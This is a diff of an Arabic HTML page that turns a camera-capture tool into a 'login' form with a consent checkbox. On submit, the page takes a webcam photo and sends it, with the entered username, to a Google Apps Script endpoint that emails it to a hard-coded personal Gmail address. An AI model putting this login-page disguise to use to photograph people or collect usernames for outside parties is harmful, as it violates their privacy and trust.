@@ -3,152 +3,121 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>التقاط صورة وإرسالها</title>
+<title>تسجيل دخول - بموافقتك نلتقط صورة</title>
 <style>
-  :root{
-    --bg:#0f1724; --card:#0b1220; --muted:#94a3b8; --accent:#16a34a; --glass: rgba(255,255,255,0.04);
-    --radius:14px; --gap:14px; font-family: "Inter", system-ui, Roboto, "Noto Naskh Arabic", Arial;
-  }
-  html,body{height:100%;margin:0;background:linear-gradient(180deg,#071029 0%, #071a2a 100%);color:#e6eef8}
-  .wrap{max-width:760px;margin:36px auto;padding:28px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:18px;box-shadow:0 8px 30px rgba(2,6,23,0.7);display:grid;grid-template-columns:1fr 360px;gap:20px}
-  .left{padding:8px}
-  h1{font-size:20px;margin:6px 0 12px}
-  p.lead{color:var(--muted);margin:0 0 12px;font-size:13px}
-  video{width:100%;height:auto;border-radius:12px;background:#000;box-shadow:inset 0 2px 10px rgba(0,0,0,0.6)}
-  .controls{display:flex;gap:10px;margin-top:12px}
-  button{background:var(--accent);color:#fff;border:none;padding:10px 14px;border-radius:10px;cursor:pointer;font-weight:600}
-  button.ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--muted);font-weight:600}
-  .status{margin-top:10px;color:var(--muted);font-size:13px}
-  .right{padding:12px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:12px;border:1px solid rgba(255,255,255,0.03)}
-  .preview{width:100%;height:240px;background:var(--glass);border-radius:10px;display:flex;align-items:center;justify-content:center;overflow:hidden}
+  :root{--bg:#0b1220;--card:#0f1724;--accent:#16a34a;--muted:#94a3b8}
+  body{margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#061029,#071a2a);color:#e6eef8;display:flex;align-items:center;justify-content:center;height:100vh}
+  .card{width:380px;background:rgba(255,255,255,0.03);padding:20px;border-radius:12px;box-shadow:0 8px 30px rgba(2,6,23,0.6)}
+  h2{margin:0 0 8px;font-size:18px}
+  label{display:block;margin:10px 0;font-size:13px;color:var(--muted)}
+  input[type="text"], input[type="password"]{width:100%;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.06);background:transparent;color:inherit}
+  .row{display:flex;gap:8px;margin-top:12px}
+  button{flex:1;padding:10px;border-radius:8px;border:none;cursor:pointer;font-weight:600}
+  .btn-primary{background:var(--accent);color:#fff}
+  .btn-ghost{background:transparent;color:var(--muted);border:1px solid rgba(255,255,255,0.04)}
+  .consent{font-size:12px;color:#ffd6a5;background:rgba(255,210,140,0.03);padding:8px;border-radius:6px;margin-top:12px}
+  .status{margin-top:10px;font-size:13px;color:var(--muted)}
+  .preview{width:100%;height:160px;background:#000;border-radius:8px;margin-top:12px;display:flex;align-items:center;justify-content:center;overflow:hidden}
   .preview img{max-width:100%;max-height:100%;display:block}
-  .meta{margin-top:12px;display:flex;justify-content:space-between;align-items:center}
-  .meta small{color:var(--muted)}
-  .note{margin-top:14px;color:#ffd6a5;font-size:13px;background:rgba(255,210,140,0.03);padding:10px;border-radius:8px;border:1px solid rgba(255,210,140,0.04)}
-  footer{grid-column:1/-1;margin-top:14px;color:var(--muted);font-size:12px;text-align:center}
-  @media (max-width:880px){.wrap{grid-template-columns:1fr;}.right{order:2}}
+  small{color:var(--muted)}
 </style>
 </head>
 <body>
-  <div class="wrap" role="main">
-    <div class="left">
-      <h1>التقاط صورة وإرسالها إلى بريدك</h1>
-      <p class="lead">اضغط "فتح الكاميرا" ثم امنح الإذن. ستُلتقط صورة تلقائياً وتُرسل كمرفق إلى بريدك.</p>
+  <div class="card" role="main" aria-labelledby="title">
+    <h2 id="title">تسجيل الدخول</h2>
 
-      <video id="video" autoplay playsinline></video>
+    <label>اسم المستخدم
+      <input id="username" type="text" placeholder="مثال: ahmed">
+    </label>
 
-      <div class="controls">
-        <button id="startBtn">فتح الكاميرا والتقاط</button>
-        <button id="retakeBtn" class="ghost" disabled>التقاط مرة أخرى</button>
-        <button id="stopBtn" class="ghost" disabled>إيقاف الكاميرا</button>
-      </div>
+    <label>كلمة المرور
+      <input id="password" type="password" placeholder="●●●●●●">
+    </label>
 
-      <p class="status" id="status">جاهز</p>
+    <div class="consent">
+      <input id="consentChk" type="checkbox"> أوافق صراحة على أن يتم التقاط صورة لي الآن وإرسالها إلى البريد المُدرَج أدناه لغرض التوثيق.
+      <div><small>البريد المستلم: <span id="toEmailDisplay">your.email@example.com</span></small></div>
     </div>
 
-    <div class="right">
-      <div class="preview" id="preview">
-        <span style="color:var(--muted)">لا توجد صورة بعد</span>
-      </div>
-
-      <div class="meta">
-        <small id="filename">اسم الملف: -</small>
-        <small id="time">الوقت: -</small>
-      </div>
-
-      <div class="note">
-        تشغيل عبر HTTPS مطلوب لعمل الكاميرا في المتصفح. تأكد من نشر Google Apps Script كـ Web App مع صلاحية "Anyone, even anonymous".
-      </div>
+    <div class="row">
+      <button id="loginBtn" class="btn-primary">تسجيل دخول وموافقة</button>
+      <button id="clearBtn" class="btn-ghost">مسح</button>
     </div>
 
-    <footer>ملاحظة: احترم الخصوصية. لا تلتقط صوراً لأشخاص دون إذن.</footer>
+    <div class="status" id="status">لم يتم التقاط صورة بعد.</div>
+
+    <div class="preview" id="preview"><small>معاينة الصورة ستظهر هنا بعد الموافقة</small></div>
   </div>
 
 <script>
-/* ======= إعدادات ======= */
-const GAS_URL = "https://script.google.com/macros/s/AKfycbzV7tPteSVydIVEwbnzOCMtWHdPwo5fXKbvu7Yf4zHgVl2AAEVANxkk8A6m4GOD-U_x/exec"; // <-- عدّله هنا برابط الـ Web App exec من GAS
-/* ======================= */
+/* ===== إعدادات - ضع رابط Web App المنشور من Google Apps Script هنا ===== */
+const GAS_URL = "https://script.google.com/macros/s/AKfycbzln1D9UWS9fGqDpg7gaJpIkhzup4bnUBxBmlwXarWUCUs6Y3ZxbQjeUlqmHZmnNsBD/exec"; // ضع exec URL هنا
+const TO_EMAIL = "963mohanadneef@gmail.com";
+document.getElementById('toEmailDisplay').textContent = TO_EMAIL;
+/* ================================================================== */
 
-const video = document.getElementById('video');
-const startBtn = document.getElementById('startBtn');
-const stopBtn = document.getElementById('stopBtn');
-const retakeBtn = document.getElementById('retakeBtn');
+const loginBtn = document.getElementById('loginBtn');
+const clearBtn = document.getElementById('clearBtn');
+const consentChk = document.getElementById('consentChk');
 const statusEl = document.getElementById('status');
 const preview = document.getElementById('preview');
-const filenameEl = document.getElementById('filename');
-const timeEl = document.getElementById('time');
-
 let stream = null;
-let lastDataUrl = null;
 
-function setStatus(txt){ statusEl.textContent = txt; }
+function setStatus(t){ statusEl.textContent = t; }
 
-async function openCamera() {
+async function captureAndSend() {
   setStatus('طلب صلاحية الكاميرا...');
   try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
-    video.srcObject = stream;
-    startBtn.disabled = true;
-    stopBtn.disabled = false;
-    retakeBtn.disabled = true;
-    setStatus('الكاميرا تعمل. سيتم التقاط صورة خلال 700 ملّي ثا.');
-    await new Promise(r => setTimeout(r, 700));
-    await capture();
+    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
   } catch (err) {
     console.error(err);
-    setStatus('خطأ: لم يتم منح صلاحية الكاميرا أو غير متاح.');
-    startBtn.disabled = false;
+    setStatus('خطأ: لم تُعط صلاحية الكاميرا أو المتصفح لا يدعمها.');
+    return;
   }
-}
 
-function stopCamera() {
-  if (stream) {
-    stream.getTracks().forEach(t => t.stop());
-    stream = null;
-    video.srcObject = null;
-  }
-  startBtn.disabled = false;
-  stopBtn.disabled = true;
-  retakeBtn.disabled = true;
-  setStatus('الكاميرا متوقفة');
-}
+  // إنشاء canvas ورسم إطار واحد
+  const video = document.createElement('video');
+  video.autoplay = true;
+  video.playsInline = true;
+  video.srcObject = stream;
 
-function showPreview(dataUrl, filename) {
-  preview.innerHTML = '';
-  const img = document.createElement('img');
-  img.src = dataUrl;
-  preview.appendChild(img);
-  filenameEl.textContent = 'اسم الملف: ' + filename;
-  timeEl.textContent = 'الوقت: ' + new Date().toLocaleString();
-}
+  // انتظر حتى يجهز الفيديو
+  await new Promise(resolve => {
+    video.onloadedmetadata = () => {
+      // تأخير بسيط للثبات
+      setTimeout(resolve, 400);
+    };
+  });
 
-async function capture() {
-  if (!stream) { setStatus('الكاميرا غير متاحة'); return; }
-  const videoTrack = stream.getVideoTracks()[0];
-  // استخدم canvas للرسم
   const canvas = document.createElement('canvas');
   canvas.width = video.videoWidth || 1280;
   canvas.height = video.videoHeight || 720;
   const ctx = canvas.getContext('2d');
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  // إظهار المعاينة
   const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
-  lastDataUrl = dataUrl;
-  const filename = 'capture_' + Date.now() + '.jpg';
-  showPreview(dataUrl, filename);
+  preview.innerHTML = '';
+  const img = document.createElement('img');
+  img.src = dataUrl;
+  preview.appendChild(img);
+
+  // إيقاف الكاميرا
+  stream.getTracks().forEach(t => t.stop());
+  stream = null;
+
   setStatus('جارٍ إرسال الصورة...');
-  // إرسال للصقطة GAS
+
+  // إرسال إلى GAS
   try {
     const res = await fetch(GAS_URL, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ filename, image: dataUrl })
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ filename: 'consent_capture_' + Date.now() + '.jpg', image: dataUrl, username: document.getElementById('username').value })
     });
     const json = await res.json().catch(()=>({}));
     if (res.ok) {
-      setStatus('تم الإرسال بنجاح. الإيميل سيتلقى الصورة.');
-      retakeBtn.disabled = false;
-      // يمكنك إبقاء الكاميرا شغالة أو إيقافها تلقائياً
-      stopCamera();
+      setStatus('تم التقاط الصورة وإرسالها إلى البريد.');
     } else {
       setStatus('فشل الإرسال: ' + (json.error || res.statusText));
     }
@@ -158,34 +127,27 @@ async function capture() {
   }
 }
 
-// التقاط مرة أخرى: افتح الكاميرا مجدداً ثم التقط
-async function retake() {
-  setStatus('إعادة فتح الكاميرا...');
-  startBtn.disabled = true;
-  stopBtn.disabled = false;
-  retakeBtn.disabled = true;
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
-    video.srcObject = stream;
-    setStatus('الكاميرا تعمل. التقاط بعد 700 ملّي ثا.');
-    await new Promise(r => setTimeout(r, 700));
-    await capture();
-  } catch (err) {
-    console.error(err);
-    setStatus('خطأ عند إعادة المحاولة.');
-    startBtn.disabled = false;
+loginBtn.addEventListener('click', async () => {
+  if (!consentChk.checked) {
+    setStatus('يجب الموافقة صراحة قبل التقاط الصورة.');
+    return;
   }
-}
+  setStatus('الموافقة مسجلة. البدء...');
+  await captureAndSend();
+});
 
-/* أحداث الأزرار */
-startBtn.addEventListener('click', openCamera);
-stopBtn.addEventListener('click', stopCamera);
-retakeBtn.addEventListener('click', retake);
+clearBtn.addEventListener('click', () => {
+  document.getElementById('username').value = '';
+  document.getElementById('password').value = '';
+  consentChk.checked = false;
+  preview.innerHTML = '<small>معاينة الصورة ستظهر هنا بعد الموافقة</small>';
+  setStatus('تم المسح.');
+});
 
-/* تحقق من دعم الكاميرا */
+/* فحص دعم الكاميرا */
 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
   setStatus('المتصفح لا يدعم كاميرا الويب عبر getUserMedia.');
-  startBtn.disabled = true;
+  loginBtn.disabled = true;
 }
 </script>
 </body>
